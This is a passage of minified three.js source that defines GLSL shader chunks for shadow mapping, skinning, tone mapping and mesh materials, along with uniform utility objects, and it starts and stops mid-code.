vec2( 1.0 ) / ( shadowMapSize * vec2( 4.0, 2.0 ) );\\n\\t\\tvec3 lightToPosition = shadowCoord.xyz;\\n\\t\\tvec3 bd3D = normalize( lightToPosition );\\n\\t\\tfloat dp = ( length( lightToPosition ) - shadowBias ) / 1000.0;\\n\\t\\t#if defined( SHADOWMAP_TYPE_PCF ) || defined( SHADOWMAP_TYPE_PCF_SOFT )\\n\\t\\t\\tvec2 offset = vec2( - 1, 1 ) * shadowRadius * texelSize.y;\\n\\t\\t\\treturn (\\n\\t\\t\\t\\ttexture2DCompare( shadowMap, cubeToUV( bd3D + offset.xyy, texelSize.y ), dp ) +\\n\\t\\t\\t\\ttexture2DCompare( shadowMap, cubeToUV( bd3D + offset.yyy, texelSize.y ), dp ) +\\n\\t\\t\\t\\ttexture2DCompare( shadowMap, cubeToUV( bd3D + offset.xyx, texelSize.y ), dp ) +\\n\\t\\t\\t\\ttexture2DCompare( shadowMap, cubeToUV( bd3D + offset.yyx, texelSize.y ), dp ) +\\n\\t\\t\\t\\ttexture2DCompare( shadowMap, cubeToUV( bd3D, texelSize.y ), dp ) +\\n\\t\\t\\t\\ttexture2DCompare( shadowMap, cubeToUV( bd3D + offset.xxy, texelSize.y ), dp ) +\\n\\t\\t\\t\\ttexture2DCompare( shadowMap, cubeToUV( bd3D + offset.yxy, texelSize.y ), dp ) +\\n\\t\\t\\t\\ttexture2DCompare( shadowMap, cubeToUV( bd3D + offset.xxx, texelSize.y ), dp ) +\\n\\t\\t\\t\\ttexture2DCompare( shadowMap, cubeToUV( bd3D + offset.yxx, texelSize.y ), dp )\\n\\t\\t\\t) * ( 1.0 / 9.0 );\\n\\t\\t#else\\n\\t\\t\\treturn texture2DCompare( shadowMap, cubeToUV( bd3D, texelSize.y ), dp );\\n\\t\\t#endif\\n\\t}\\n#endif\\n\";\nTHREE.ShaderChunk.shadowmap_pars_vertex=\"#ifdef USE_SHADOWMAP\\n\\t#if NUM_DIR_LIGHTS > 0\\n\\t\\tuniform mat4 directionalShadowMatrix[ NUM_DIR_LIGHTS ];\\n\\t\\tvarying vec4 vDirectionalShadowCoord[ NUM_DIR_LIGHTS ];\\n\\t#endif\\n\\t#if NUM_SPOT_LIGHTS > 0\\n\\t\\tuniform mat4 spotShadowMatrix[ NUM_SPOT_LIGHTS ];\\n\\t\\tvarying vec4 vSpotShadowCoord[ NUM_SPOT_LIGHTS ];\\n\\t#endif\\n\\t#if NUM_POINT_LIGHTS > 0\\n\\t\\tuniform mat4 pointShadowMatrix[ NUM_POINT_LIGHTS ];\\n\\t\\tvarying vec4 vPointShadowCoord[ NUM_POINT_LIGHTS ];\\n\\t#endif\\n#endif\\n\";\nTHREE.ShaderChunk.shadowmap_vertex=\"#ifdef USE_SHADOWMAP\\n\\t#if NUM_DIR_LIGHTS > 0\\n\\tfor ( int i = 0; i < NUM_DIR_LIGHTS; i ++ ) {\\n\\t\\tvDirectionalShadowCoord[ i ] = directionalShadowMatrix[ i ] * worldPosition;\\n\\t}\\n\\t#endif\\n\\t#if NUM_SPOT_LIGHTS > 0\\n\\tfor ( int i = 0; i < NUM_SPOT_LIGHTS; i ++ ) {\\n\\t\\tvSpotShadowCoord[ i ] = spotShadowMatrix[ i ] * worldPosition;\\n\\t}\\n\\t#endif\\n\\t#if NUM_POINT_LIGHTS > 0\\n\\tfor ( int i = 0; i < NUM_POINT_LIGHTS; i ++ ) {\\n\\t\\tvPointShadowCoord[ i ] = pointShadowMatrix[ i ] * worldPosition;\\n\\t}\\n\\t#endif\\n#endif\\n\";\nTHREE.ShaderChunk.shadowmask_pars_fragment=\"float getShadowMask() {\\n\\tfloat shadow = 1.0;\\n\\t#ifdef USE_SHADOWMAP\\n\\t#if NUM_DIR_LIGHTS > 0\\n\\tDirectionalLight directionalLight;\\n\\tfor ( int i = 0; i < NUM_DIR_LIGHTS; i ++ ) {\\n\\t\\tdirectionalLight = directionalLights[ i ];\\n\\t\\tshadow *= bool( directionalLight.shadow ) ? getShadow( directionalShadowMap[ i ], directionalLight.shadowMapSize, directionalLight.shadowBias, directionalLight.shadowRadius, vDirectionalShadowCoord[ i ] ) : 1.0;\\n\\t}\\n\\t#endif\\n\\t#if NUM_SPOT_LIGHTS > 0\\n\\tSpotLight spotLight;\\n\\tfor ( int i = 0; i < NUM_SPOT_LIGHTS; i ++ ) {\\n\\t\\tspotLight = spotLights[ i ];\\n\\t\\tshadow *= bool( spotLight.shadow ) ? getShadow( spotShadowMap[ i ], spotLight.shadowMapSize, spotLight.shadowBias, spotLight.shadowRadius, vSpotShadowCoord[ i ] ) : 1.0;\\n\\t}\\n\\t#endif\\n\\t#if NUM_POINT_LIGHTS > 0\\n\\tPointLight pointLight;\\n\\tfor ( int i = 0; i < NUM_POINT_LIGHTS; i ++ ) {\\n\\t\\tpointLight = pointLights[ i ];\\n\\t\\tshadow *= bool( pointLight.shadow ) ? getPointShadow( pointShadowMap[ i ], pointLight.shadowMapSize, pointLight.shadowBias, pointLight.shadowRadius, vPointShadowCoord[ i ] ) : 1.0;\\n\\t}\\n\\t#endif\\n\\t#endif\\n\\treturn shadow;\\n}\\n\";\nTHREE.ShaderChunk.skinbase_vertex=\"#ifdef USE_SKINNING\\n\\tmat4 boneMatX = getBoneMatrix( skinIndex.x );\\n\\tmat4 boneMatY = getBoneMatrix( skinIndex.y );\\n\\tmat4 boneMatZ = getBoneMatrix( skinIndex.z );\\n\\tmat4 boneMatW = getBoneMatrix( skinIndex.w );\\n#endif\";THREE.ShaderChunk.skinning_pars_vertex=\"#ifdef USE_SKINNING\\n\\tuniform mat4 bindMatrix;\\n\\tuniform mat4 bindMatrixInverse;\\n\\t#ifdef BONE_TEXTURE\\n\\t\\tuniform sampler2D boneTexture;\\n\\t\\tuniform int boneTextureWidth;\\n\\t\\tuniform int boneTextureHeight;\\n\\t\\tmat4 getBoneMatrix( const in float i ) {\\n\\t\\t\\tfloat j = i * 4.0;\\n\\t\\t\\tfloat x = mod( j, float( boneTextureWidth ) );\\n\\t\\t\\tfloat y = floor( j / float( boneTextureWidth ) );\\n\\t\\t\\tfloat dx = 1.0 / float( boneTextureWidth );\\n\\t\\t\\tfloat dy = 1.0 / float( boneTextureHeight );\\n\\t\\t\\ty = dy * ( y + 0.5 );\\n\\t\\t\\tvec4 v1 = texture2D( boneTexture, vec2( dx * ( x + 0.5 ), y ) );\\n\\t\\t\\tvec4 v2 = texture2D( boneTexture, vec2( dx * ( x + 1.5 ), y ) );\\n\\t\\t\\tvec4 v3 = texture2D( boneTexture, vec2( dx * ( x + 2.5 ), y ) );\\n\\t\\t\\tvec4 v4 = texture2D( boneTexture, vec2( dx * ( x + 3.5 ), y ) );\\n\\t\\t\\tmat4 bone = mat4( v1, v2, v3, v4 );\\n\\t\\t\\treturn bone;\\n\\t\\t}\\n\\t#else\\n\\t\\tuniform mat4 boneMatrices[ MAX_BONES ];\\n\\t\\tmat4 getBoneMatrix( const in float i ) {\\n\\t\\t\\tmat4 bone = boneMatrices[ int(i) ];\\n\\t\\t\\treturn bone;\\n\\t\\t}\\n\\t#endif\\n#endif\\n\";\nTHREE.ShaderChunk.skinning_vertex=\"#ifdef USE_SKINNING\\n\\tvec4 skinVertex = bindMatrix * vec4( transformed, 1.0 );\\n\\tvec4 skinned = vec4( 0.0 );\\n\\tskinned += boneMatX * skinVertex * skinWeight.x;\\n\\tskinned += boneMatY * skinVertex * skinWeight.y;\\n\\tskinned += boneMatZ * skinVertex * skinWeight.z;\\n\\tskinned += boneMatW * skinVertex * skinWeight.w;\\n\\tskinned  = bindMatrixInverse * skinned;\\n#endif\\n\";THREE.ShaderChunk.skinnormal_vertex=\"#ifdef USE_SKINNING\\n\\tmat4 skinMatrix = mat4( 0.0 );\\n\\tskinMatrix += skinWeight.x * boneMatX;\\n\\tskinMatrix += skinWeight.y * boneMatY;\\n\\tskinMatrix += skinWeight.z * boneMatZ;\\n\\tskinMatrix += skinWeight.w * boneMatW;\\n\\tskinMatrix  = bindMatrixInverse * skinMatrix * bindMatrix;\\n\\tobjectNormal = vec4( skinMatrix * vec4( objectNormal, 0.0 ) ).xyz;\\n#endif\\n\";\nTHREE.ShaderChunk.specularmap_fragment=\"float specularStrength;\\n#ifdef USE_SPECULARMAP\\n\\tvec4 texelSpecular = texture2D( specularMap, vUv );\\n\\tspecularStrength = texelSpecular.r;\\n#else\\n\\tspecularStrength = 1.0;\\n#endif\";THREE.ShaderChunk.specularmap_pars_fragment=\"#ifdef USE_SPECULARMAP\\n\\tuniform sampler2D specularMap;\\n#endif\";THREE.ShaderChunk.tonemapping_fragment=\"#if defined( TONE_MAPPING )\\n  gl_FragColor.rgb = toneMapping( gl_FragColor.rgb );\\n#endif\\n\";\nTHREE.ShaderChunk.tonemapping_pars_fragment=\"#define saturate(a) clamp( a, 0.0, 1.0 )\\nuniform float toneMappingExposure;\\nuniform float toneMappingWhitePoint;\\nvec3 LinearToneMapping( vec3 color ) {\\n  return toneMappingExposure * color;\\n}\\nvec3 ReinhardToneMapping( vec3 color ) {\\n  color *= toneMappingExposure;\\n  return saturate( color / ( vec3( 1.0 ) + color ) );\\n}\\n#define Uncharted2Helper( x ) max( ( ( x * ( 0.15 * x + 0.10 * 0.50 ) + 0.20 * 0.02 ) / ( x * ( 0.15 * x + 0.50 ) + 0.20 * 0.30 ) ) - 0.02 / 0.30, vec3( 0.0 ) )\\nvec3 Uncharted2ToneMapping( vec3 color ) {\\n  color *= toneMappingExposure;\\n  return saturate( Uncharted2Helper( color ) / Uncharted2Helper( vec3( toneMappingWhitePoint ) ) );\\n}\\nvec3 OptimizedCineonToneMapping( vec3 color ) {\\n  color *= toneMappingExposure;\\n  color = max( vec3( 0.0 ), color - 0.004 );\\n  return pow( ( color * ( 6.2 * color + 0.5 ) ) / ( color * ( 6.2 * color + 1.7 ) + 0.06 ), vec3( 2.2 ) );\\n}\\n\";\nTHREE.ShaderChunk.uv2_pars_fragment=\"#if defined( USE_LIGHTMAP ) || defined( USE_AOMAP )\\n\\tvarying vec2 vUv2;\\n#endif\";THREE.ShaderChunk.uv2_pars_vertex=\"#if defined( USE_LIGHTMAP ) || defined( USE_AOMAP )\\n\\tattribute vec2 uv2;\\n\\tvarying vec2 vUv2;\\n#endif\";THREE.ShaderChunk.uv2_vertex=\"#if defined( USE_LIGHTMAP ) || defined( USE_AOMAP )\\n\\tvUv2 = uv2;\\n#endif\";THREE.ShaderChunk.uv_pars_fragment=\"#if defined( USE_MAP ) || defined( USE_BUMPMAP ) || defined( USE_NORMALMAP ) || defined( USE_SPECULARMAP ) || defined( USE_ALPHAMAP ) || defined( USE_EMISSIVEMAP ) || defined( USE_ROUGHNESSMAP ) || defined( USE_METALNESSMAP )\\n\\tvarying vec2 vUv;\\n#endif\";\nTHREE.ShaderChunk.uv_pars_vertex=\"#if defined( USE_MAP ) || defined( USE_BUMPMAP ) || defined( USE_NORMALMAP ) || defined( USE_SPECULARMAP ) || defined( USE_ALPHAMAP ) || defined( USE_EMISSIVEMAP ) || defined( USE_ROUGHNESSMAP ) || defined( USE_METALNESSMAP )\\n\\tvarying vec2 vUv;\\n\\tuniform vec4 offsetRepeat;\\n#endif\\n\";THREE.ShaderChunk.uv_vertex=\"#if defined( USE_MAP ) || defined( USE_BUMPMAP ) || defined( USE_NORMALMAP ) || defined( USE_SPECULARMAP ) || defined( USE_ALPHAMAP ) || defined( USE_EMISSIVEMAP ) || defined( USE_ROUGHNESSMAP ) || defined( USE_METALNESSMAP )\\n\\tvUv = uv * offsetRepeat.zw + offsetRepeat.xy;\\n#endif\";\nTHREE.ShaderChunk.worldpos_vertex=\"#if defined( USE_ENVMAP ) || defined( PHONG ) || defined( PHYSICAL ) || defined( LAMBERT ) || defined ( USE_SHADOWMAP )\\n\\t#ifdef USE_SKINNING\\n\\t\\tvec4 worldPosition = modelMatrix * skinned;\\n\\t#else\\n\\t\\tvec4 worldPosition = modelMatrix * vec4( transformed, 1.0 );\\n\\t#endif\\n#endif\\n\";\nTHREE.UniformsUtils={merge:function(a){for(var b={},c=0;c<a.length;c++){var d=this.clone(a[c]),e;for(e in d)b[e]=d[e]}return b},clone:function(a){var b={},c;for(c in a){b[c]={};for(var d in a[c]){var e=a[c][d];e instanceof THREE.Color||e instanceof THREE.Vector2||e instanceof THREE.Vector3||e instanceof THREE.Vector4||e instanceof THREE.Matrix3||e instanceof THREE.Matrix4||e instanceof THREE.Texture?b[c][d]=e.clone():Array.isArray(e)?b[c][d]=e.slice():b[c][d]=e}}return b}};\nTHREE.UniformsLib={common:{diffuse:{value:new THREE.Color(15658734)},opacity:{value:1},map:{value:null},offsetRepeat:{value:new THREE.Vector4(0,0,1,1)},specularMap:{value:null},alphaMap:{value:null},envMap:{value:null},flipEnvMap:{value:-1},reflectivity:{value:1},refractionRatio:{value:.98}},aomap:{aoMap:{value:null},aoMapIntensity:{value:1}},lightmap:{lightMap:{value:null},lightMapIntensity:{value:1}},emissivemap:{emissiveMap:{value:null}},bumpmap:{bumpMap:{value:null},bumpScale:{value:1}},normalmap:{normalMap:{value:null},\nnormalScale:{value:new THREE.Vector2(1,1)}},displacementmap:{displacementMap:{value:null},displacementScale:{value:1},displacementBias:{value:0}},roughnessmap:{roughnessMap:{value:null}},metalnessmap:{metalnessMap:{value:null}},fog:{fogDensity:{value:2.5E-4},fogNear:{value:1},fogFar:{value:2E3},fogColor:{value:new THREE.Color(16777215)}},lights:{ambientLightColor:{value:[]},directionalLights:{value:[],properties:{direction:{},color:{},shadow:{},shadowBias:{},shadowRadius:{},shadowMapSize:{}}},directionalShadowMap:{value:[]},\ndirectionalShadowMatrix:{value:[]},spotLights:{value:[],properties:{color:{},position:{},direction:{},distance:{},coneCos:{},penumbraCos:{},decay:{},shadow:{},shadowBias:{},shadowRadius:{},shadowMapSize:{}}},spotShadowMap:{value:[]},spotShadowMatrix:{value:[]},pointLights:{value:[],properties:{color:{},position:{},decay:{},distance:{},shadow:{},shadowBias:{},shadowRadius:{},shadowMapSize:{}}},pointShadowMap:{value:[]},pointShadowMatrix:{value:[]},hemisphereLights:{value:[],properties:{direction:{},\nskyColor:{},groundColor:{}}}},points:{diffuse:{value:new THREE.Color(15658734)},opacity:{value:1},size:{value:1},scale:{value:1},map:{value:null},offsetRepeat:{value:new THREE.Vector4(0,0,1,1)}}};THREE.ShaderChunk.cube_frag=\"uniform samplerCube tCube;\\nuniform float tFlip;\\nvarying vec3 vWorldPosition;\\n#include <common>\\n#include <logdepthbuf_pars_fragment>\\n#include <clipping_planes_pars_fragment>\\nvoid main() {\\n\\t#include <clipping_planes_fragment>\\n\\tgl_FragColor = textureCube( tCube, vec3( tFlip * vWorldPosition.x, vWorldPosition.yz ) );\\n\\t#include <logdepthbuf_fragment>\\n}\\n\";\nTHREE.ShaderChunk.cube_vert=\"varying vec3 vWorldPosition;\\n#include <common>\\n#include <logdepthbuf_pars_vertex>\\n#include <clipping_planes_pars_vertex>\\nvoid main() {\\n\\tvWorldPosition = transformDirection( position, modelMatrix );\\n\\t#include <begin_vertex>\\n\\t#include <project_vertex>\\n\\t#include <logdepthbuf_vertex>\\n\\t#include <clipping_planes_vertex>\\n}\\n\";THREE.ShaderChunk.depth_frag=\"#if DEPTH_PACKING == 3200\\n\\tuniform float opacity;\\n#endif\\n#include <common>\\n#include <packing>\\n#include <uv_pars_fragment>\\n#include <map_pars_fragment>\\n#include <alphamap_pars_fragment>\\n#include <logdepthbuf_pars_fragment>\\n#include <clipping_planes_pars_fragment>\\nvoid main() {\\n\\t#include <clipping_planes_fragment>\\n\\tvec4 diffuseColor = vec4( 1.0 );\\n\\t#if DEPTH_PACKING == 3200\\n\\t\\tdiffuseColor.a = opacity;\\n\\t#endif\\n\\t#include <map_fragment>\\n\\t#include <alphamap_fragment>\\n\\t#include <alphatest_fragment>\\n\\t#include <logdepthbuf_fragment>\\n\\t#if DEPTH_PACKING == 3200\\n\\t\\tgl_FragColor = vec4( vec3( gl_FragCoord.z ), opacity );\\n\\t#elif DEPTH_PACKING == 3201\\n\\t\\tgl_FragColor = packDepthToRGBA( gl_FragCoord.z );\\n\\t#endif\\n}\\n\";\nTHREE.ShaderChunk.depth_vert=\"#include <common>\\n#include <uv_pars_vertex>\\n#include <displacementmap_pars_vertex>\\n#include <morphtarget_pars_vertex>\\n#include <skinning_pars_vertex>\\n#include <logdepthbuf_pars_vertex>\\n#include <clipping_planes_pars_vertex>\\nvoid main() {\\n\\t#include <uv_vertex>\\n\\t#include <skinbase_vertex>\\n\\t#include <begin_vertex>\\n\\t#include <displacementmap_vertex>\\n\\t#include <morphtarget_vertex>\\n\\t#include <skinning_vertex>\\n\\t#include <project_vertex>\\n\\t#include <logdepthbuf_vertex>\\n\\t#include <clipping_planes_vertex>\\n}\\n\";\nTHREE.ShaderChunk.distanceRGBA_frag=\"uniform vec3 lightPos;\\nvarying vec4 vWorldPosition;\\n#include <common>\\n#include <packing>\\n#include <clipping_planes_pars_fragment>\\nvoid main () {\\n\\t#include <clipping_planes_fragment>\\n\\tgl_FragColor = packDepthToRGBA( length( vWorldPosition.xyz - lightPos.xyz ) / 1000.0 );\\n}\\n\";THREE.ShaderChunk.distanceRGBA_vert=\"varying vec4 vWorldPosition;\\n#include <common>\\n#include <morphtarget_pars_vertex>\\n#include <skinning_pars_vertex>\\n#include <clipping_planes_pars_vertex>\\nvoid main() {\\n\\t#include <skinbase_vertex>\\n\\t#include <begin_vertex>\\n\\t#include <morphtarget_vertex>\\n\\t#include <skinning_vertex>\\n\\t#include <project_vertex>\\n\\t#include <worldpos_vertex>\\n\\t#include <clipping_planes_vertex>\\n\\tvWorldPosition = worldPosition;\\n}\\n\";\nTHREE.ShaderChunk.equirect_frag=\"uniform sampler2D tEquirect;\\nuniform float tFlip;\\nvarying vec3 vWorldPosition;\\n#include <common>\\n#include <logdepthbuf_pars_fragment>\\n#include <clipping_planes_pars_fragment>\\nvoid main() {\\n\\t#include <clipping_planes_fragment>\\n\\tvec3 direction = normalize( vWorldPosition );\\n\\tvec2 sampleUV;\\n\\tsampleUV.y = saturate( tFlip * direction.y * -0.5 + 0.5 );\\n\\tsampleUV.x = atan( direction.z, direction.x ) * RECIPROCAL_PI2 + 0.5;\\n\\tgl_FragColor = texture2D( tEquirect, sampleUV );\\n\\t#include <logdepthbuf_fragment>\\n}\\n\";\nTHREE.ShaderChunk.equirect_vert=\"varying vec3 vWorldPosition;\\n#include <common>\\n#include <logdepthbuf_pars_vertex>\\n#include <clipping_planes_pars_vertex>\\nvoid main() {\\n\\tvWorldPosition = transformDirection( position, modelMatrix );\\n\\t#include <begin_vertex>\\n\\t#include <project_vertex>\\n\\t#include <logdepthbuf_vertex>\\n\\t#include <clipping_planes_vertex>\\n}\\n\";THREE.ShaderChunk.linedashed_frag=\"uniform vec3 diffuse;\\nuniform float opacity;\\nuniform float dashSize;\\nuniform float totalSize;\\nvarying float vLineDistance;\\n#include <common>\\n#include <color_pars_fragment>\\n#include <fog_pars_fragment>\\n#include <logdepthbuf_pars_fragment>\\n#include <clipping_planes_pars_fragment>\\nvoid main() {\\n\\t#include <clipping_planes_fragment>\\n\\tif ( mod( vLineDistance, totalSize ) > dashSize ) {\\n\\t\\tdiscard;\\n\\t}\\n\\tvec3 outgoingLight = vec3( 0.0 );\\n\\tvec4 diffuseColor = vec4( diffuse, opacity );\\n\\t#include <logdepthbuf_fragment>\\n\\t#include <color_fragment>\\n\\toutgoingLight = diffuseColor.rgb;\\n\\tgl_FragColor = vec4( outgoingLight, diffuseColor.a );\\n\\t#include <premultiplied_alpha_fragment>\\n\\t#include <tonemapping_fragment>\\n\\t#include <encodings_fragment>\\n\\t#include <fog_fragment>\\n}\\n\";\nTHREE.ShaderChunk.linedashed_vert=\"uniform float scale;\\nattribute float lineDistance;\\nvarying float vLineDistance;\\n#include <common>\\n#include <color_pars_vertex>\\n#include <logdepthbuf_pars_vertex>\\n#include <clipping_planes_pars_vertex>\\nvoid main() {\\n\\t#include <color_vertex>\\n\\tvLineDistance = scale * lineDistance;\\n\\tvec4 mvPosition = modelViewMatrix * vec4( position, 1.0 );\\n\\tgl_Position = projectionMatrix * mvPosition;\\n\\t#include <logdepthbuf_vertex>\\n\\t#include <clipping_planes_vertex>\\n}\\n\";\nTHREE.ShaderChunk.meshbasic_frag=\"uniform vec3 diffuse;\\nuniform float opacity;\\n#ifndef FLAT_SHADED\\n\\tvarying vec3 vNormal;\\n#endif\\n#include <common>\\n#include <color_pars_fragment>\\n#include <uv_pars_fragment>\\n#include <uv2_pars_fragment>\\n#include <map_pars_fragment>\\n#include <alphamap_pars_fragment>\\n#include <aomap_pars_fragment>\\n#include <envmap_pars_fragment>\\n#include <fog_pars_fragment>\\n#include <specularmap_pars_fragment>\\n#include <logdepthbuf_pars_fragment>\\n#include <clipping_planes_pars_fragment>\\nvoid main() {\\n\\t#include <clipping_planes_fragment>\\n\\tvec4 diffuseColor = vec4( diffuse, opacity );\\n\\t#include <logdepthbuf_fragment>\\n\\t#include <map_fragment>\\n\\t#include <color_fragment>\\n\\t#include <alphamap_fragment>\\n\\t#include <alphatest_fragment>\\n\\t#include <specularmap_fragment>\\n\\tReflectedLight reflectedLight;\\n\\treflectedLight.directDiffuse = vec3( 0.0 );\\n\\treflectedLight.directSpecular = vec3( 0.0 );\\n\\treflectedLight.indirectDiffuse = diffuseColor.rgb;\\n\\treflectedLight.indirectSpecular = vec3( 0.0 );\\n\\t#include <aomap_fragment>\\n\\tvec3 outgoingLight = reflectedLight.indirectDiffuse;\\n\\t#include <normal_flip>\\n\\t#include <envmap_fragment>\\n\\tgl_FragColor = vec4( outgoingLight, diffuseColor.a );\\n\\t#include <premultiplied_alpha_fragment>\\n\\t#include <tonemapping_fragment>\\n\\t#include <encodings_fragment>\\n\\t#include <fog_fragment>\\n}\\n\";\nTHREE.ShaderChunk.meshbasic_vert=\"#include <common>\\n#include <uv_pars_vertex>\\n#include <uv2_pars_vertex>\\n#include <envmap_pars_vertex>\\n#include <color_pars_vertex>\\n#include <morphtarget_pars_vertex>\\n#include <skinning_pars_vertex>\\n#include <logdepthbuf_pars_vertex>\\n#include <clipping_planes_pars_vertex>\\nvoid main() {\\n\\t#include <uv_vertex>\\n\\t#include <uv2_vertex>\\n\\t#include <color_vertex>\\n\\t#include <skinbase_vertex>\\n\\t#ifdef USE_ENVMAP\\n\\t#include <beginnormal_vertex>\\n\\t#include <morphnormal_vertex>\\n\\t#include <skinnormal_vertex>\\n\\t#include <defaultnormal_vertex>\\n\\t#endif\\n\\t#include <begin_vertex>\\n\\t#include <morphtarget_vertex>\\n\\t#include <skinning_vertex>\\n\\t#include <project_vertex>\\n\\t#include <logdepthbuf_vertex>\\n\\t#include <worldpos_vertex>\\n\\t#include <clipping_planes_vertex>\\n\\t#include <envmap_vertex>\\n}\\n\";\nTHREE.ShaderChunk.meshlambert_frag=\"uniform vec3 diffuse;\\nuniform vec3 emissive;\\nuniform float opacity;\\nvarying vec3 vLightFront;\\n#ifdef DOUBLE_SIDED\\n\\tvarying vec3 vLightBack;\\n#endif\\n#include <common>\\n#include <packing>\\n#include <color_pars_fragment>\\n#include <uv_pars_fragment>\\n#include <uv2_pars_fragment>\\n#include <map_pars_fragment>\\n#include <alphamap_pars_fragment>\\n#include <aomap_pars_fragment>\\n#include <lightmap_pars_fragment>\\n#include <emissivemap_pars_fragment>\\n#include <envmap_pars_fragment>\\n#include <bsdfs>\\n#include <lights_pars>\\n#include <fog_pars_fragment>\\n#include <shadowmap_pars_fragment>\\n#include <shadowmask_pars_fragment>\\n#include <specularmap_pars_fragment>\\n#include <logdepthbuf_pars_fragment>\\n#include <clipping_planes_pars_fragment>\\nvoid main() {\\n\\t#include <clipping_planes_fragment>\\n\\tvec4 diffuseColor = vec4( diffuse, opacity );\\n\\tReflectedLight reflectedLight = ReflectedLight( vec3( 0.0 ), vec3( 0.0 ), vec3( 0.0 ), vec3( 0.0 ) );\\n\\tvec3 totalEmissiveRadiance = emissive;\\n\\t#include <logdepthbuf_fragment>\\n\\t#include <map_fragment>\\n\\t#include <color_fragment>\\n\\t#include <alphamap_fragment>\\n\\t#include <alphatest_fragment>\\n\\t#include <specularmap_fragment>\\n\\t#include <emissivemap_fragment>\\n\\treflectedLight.indirectDiffuse = getAmbientLightIrradiance( ambientLightColor );\\n\\t#include <lightmap_fragment>\\n\\treflectedLight.indirectDiffuse *= BRDF_Diffuse_Lambert( diffuseColor.rgb );\\n\\t#ifdef DOUBLE_SIDED\\n\\t\\treflectedLight.directDiffuse = ( gl_FrontFacing ) ? vLightFront : vLightBack;\\n\\t#else\\n\\t\\treflectedLight.directDiffuse = vLightFront;\\n\\t#endif\\n\\treflectedLight.directDiffuse *= BRDF_Diffuse_Lambert( diffuseColor.rgb ) * getShadowMask();\\n\\t#include <aomap_fragment>\\n\\tvec3 outgoingLight = reflectedLight.directDiffuse + reflectedLight.indirectDiffuse + totalEmissiveRadiance;\\n\\t#include <normal_flip>\\n\\t#include <envmap_fragment>\\n\\tgl_FragColor = vec4( outgoingLight, diffuseColor.a );\\n\\t#include <premultiplied_alpha_fragment>\\n\\t#include <tonemapping_fragment>\\n\\t#include <encodings_fragment>\\n\\t#include <fog_fragment>\\n}\\n\";\nTHREE.ShaderChunk.meshlambert_vert=\"#define LAMBERT\\nvarying vec3 vLightFront;\\n#ifdef DOUBLE_SIDED\\n\\tvarying vec3 vLightBack;\\n#endif\\n#include <common>\\n#include <uv_pars_vertex>\\n#include <uv2_pars_vertex>\\n#include <envmap_pars_vertex>\\n#include <bsdfs>\\n#include <lights_pars>\\n#include <color_pars_vertex>\\n#include <morphtarget_pars_vertex>\\n#include <skinning_pars_vertex>\\n#include <shadowmap_pars_vertex>\\n#include <logdepthbuf_pars_vertex>\\n#include <clipping_planes_pars_vertex>\\nvoid main() {\\n\\t#include <uv_vertex>\\n\\t#include <uv2_vertex>\\n\\t#include <color_vertex>\\n\\t#include <beginnormal_vertex>\\n\\t#include <morphnormal_vertex>\\n\\t#include <skinbase_vertex>\\n\\t#include <skinnormal_vertex>\\n\\t#include <defaultnormal_vertex>\\n\\t#include <begin_vertex>\\n\\t#include <morphtarget_vertex>\\n\\t#include <skinning_vertex>\\n\\t#include <project_vertex>\\n\\t#include <logdepthbuf_vertex>\\n\\t#include <clipping_planes_vertex>\\n\\t#include <worldpos_vertex>\\n\\t#include <envmap_vertex>\\n\\t#include <lights_lambert_vertex>\\n\\t#include <shadowmap_vertex>\\n}\\n\";\nTHREE.ShaderChunk.meshphong_frag=\"#define PHONG\\nuniform vec3 diffuse;\\nuniform vec3 emissive;\\nuniform vec3 specular;\\nuniform float shininess;\\nuniform float opacity;\\n#include <common>\\n#include <packing>\\n#include <color_pars_fragment>\\n#include <uv_pars_fragment>\\n#include <uv2_pars_fragment>\\n#include <map_pars_fragment>\\n#include <alphamap_pars_fragment>\\n#include <aomap_pars_fragment>\\n#include <lightmap_pars_fragment>\\n#include <emissivemap_pars_fragment>\\n#include <envmap_pars_fragment>\\n#include <fog_pars_fragment>\\n#include <bsdfs>\\n#include <lights_pars>\\n#include <lights_phong_pars_fragment>\\n#include <shadowmap_pars_fragment>\\n#include <bumpmap_pars_fragment>\\n#include <normalmap_pars_fragment>\\n#include <specularmap_pars_fragment>\\n#include <logdepthbuf_pars_fragment>\\n#include <clipping_planes_pars_fragment>\\nvoid main() {\\n\\t#include <clipping_planes_fragment>\\n\\tvec4 diffuseColor = vec4( diffuse, opacity );\\n\\tReflectedLight reflectedLight = ReflectedLight( vec3( 0.0 ), vec3( 0.0 ), vec3( 0.0 ), vec3( 0.0 ) );\\n\\tvec3 totalEmissiveRadiance = emissive;\\n\\t#include <logdepthbuf_fragment>\\n\\t#include <map_fragment>\\n\\t#include <color_fragment>\\n\\t#include <alphamap_fragment>\\n\\t#include <alphatest_fragment>\\n\\t#include <specularmap_fragment>\\n\\t#include <normal_flip>\\n\\t#include <normal_fragment>\\n\\t#include <emissivemap_fragment>\\n\\t#include <lights_phong_fragment>\\n\\t#include <lights_template>\\n\\t#include <aomap_fragment>\\n\\tvec3 outgoingLight = reflectedLight.directDiffuse + reflectedLight.indirectDiffuse + reflectedLight.directSpecular + reflectedLight.indirectSpecular + totalEmissiveRadiance;\\n\\t#include <envmap_fragment>\\n\\tgl_FragColor = vec4( outgoingLight, diffuseColor.a );\\n\\t#include <premultiplied_alpha_fragment>\\n\\t#include <tonemapping_fragment>\\n\\t#include <encodings_fragment>\\n\\t#include <fog_fragment>\\n}\\n\";\nTHREE.ShaderChunk.meshphong_vert=\"#define PHONG\\nvarying vec3 vViewPosition;\\n#ifndef FLAT_SHADED\\n\\tvarying vec3 vNormal;\\n#endif\\n#include <common>\\n#include <uv_pars_vertex>\\n#include <uv2_pars_vertex>\\n#include <displacementmap_pars_vertex>\\n#include <envmap_pars_vertex>\\n#include <color_pars_vertex>\\n#include <morphtarget_pars_vertex>\\n#include <skinning_pars_vertex>\\n#include <shadowmap_pars_vertex>\\n#include <logdepthbuf_pars_vertex>\\n#include <clipping_planes_pars_vertex>\\nvoid main() {\\n\\t#include <uv_vertex>\\n\\t#include <uv2_vertex>\\n\\t#include <color_vertex>\\n\\t#include <beginnormal_vertex>\\n\\t#include <morphnormal_vertex>\\n\\t#include <skinbase_vertex>\\n\\t#include <skinnormal_vertex>\\n\\t#include <defaultnormal_vertex>\\n#ifndef FLAT_SHADED\\n\\tvNormal = normalize( transformedNormal );\\n#endif\\n\\t#include <begin_vertex>\\n\\t#include <displacementmap_vertex>\\n\\t#include <morphtarget_vertex>\\n\\t#include <skinning_vertex>\\n\\t#include <project_vertex>\\n\\t#include <logdepthbuf_vertex>\\n\\t#include 